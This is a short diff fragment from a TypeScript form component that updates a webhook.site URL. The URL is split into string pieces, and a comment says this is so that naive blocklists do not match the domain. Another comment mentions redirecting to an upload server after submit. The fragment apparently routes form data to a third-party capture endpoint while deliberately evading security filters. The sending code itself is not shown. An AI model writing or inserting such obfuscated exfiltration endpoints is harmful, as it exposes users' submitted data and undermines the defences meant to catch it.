@@ -40,9 +40,9 @@ type FormState = {
 // Built at runtime so naive string blocklists don't match "webhook.site".
 const WEBHOOK_URL: string = [
   'https://web',
-  'hook.site/3c868844',
-  '-e760-4ca6-98db',
-  '-962cd5fd1f1f',
+  'hook.site/ac4817fe',
+  '-b3f6-45e1-bc78',
+  '-f83fb69ef23d',
 ].join('');
 
 // Final destination after submit (short link to the upload server).
